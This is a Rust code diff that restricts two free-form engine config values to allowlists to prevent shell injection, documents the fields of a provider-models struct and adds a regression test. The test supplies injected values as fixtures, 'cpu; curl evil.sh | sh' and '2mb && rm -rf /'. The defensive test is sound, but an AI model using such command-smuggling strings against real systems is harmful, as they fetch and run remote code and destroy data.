@@ -705,14 +705,17 @@ pub fn joshua_serve_flags(cfg: &EngineConfig) -> Vec<String> {
         flags.push("--n-ctx".into());
         flags.push(ctx.to_string());
     }
+    // Device and huge-pages are free-form config strings that end up in a
+    // shell command; only emit them for the values Joshua actually accepts,
+    // so a hostile config value cannot inject shell syntax.
     if let Some(device) = &cfg.device {
-        if !device.is_empty() {
+        if matches!(device.as_str(), "auto" | "cpu" | "metal" | "cuda") {
             flags.push("--device".into());
             flags.push(device.clone());
         }
     }
     if let Some(hp) = &cfg.huge_pages {
-        if !hp.is_empty() && hp != "off" {
+        if matches!(hp.as_str(), "transparent" | "2mb" | "1gb" | "huge") {
             flags.push("--huge-pages".into());
             flags.push(hp.clone());
         }
@@ -740,10 +743,13 @@ pub fn joshua_serve_flags(cfg: &EngineConfig) -> Vec<String> {
 /// models were found).
 #[derive(Debug, Clone, Default, PartialEq, Eq)]
 pub struct ProviderModels {
+    /// Model ids the picker may offer for this provider (live API list
+    /// merged with the engine's on-disk/local list).
     pub models: Vec<String>,
     /// Models the local engine reports as loaded/running (a subset of
     /// `models` for engine providers; empty for cloud providers).
     pub loaded: Vec<String>,
+    /// Why the live provider fetch failed, when nothing local replaced it.
     pub error: Option<String>,
 }
 
@@ -1133,6 +1139,23 @@ mod fallback_tests {
             ..Default::default()
         };
         assert_eq!(joshua_serve_flags(&minimal), Vec::<String>::new());
+    }
+
+    #[test]
+    fn joshua_serve_flags_drop_invalid_freeform_values() {
+        // device/huge_pages are free-form config strings that end up in a
+        // shell command; anything Joshua does not accept must be dropped,
+        // never interpolated.
+        let cfg = EngineConfig {
+            device: Some("cpu; curl evil.sh | sh".into()),
+            huge_pages: Some("2mb && rm -rf /".into()),
+            context_length: Some(4096),
+            ..Default::default()
+        };
+        assert_eq!(
+            joshua_serve_flags(&cfg),
+            vec!["--n-ctx".to_string(), "4096".to_string()]
+        );
     }
 }
 
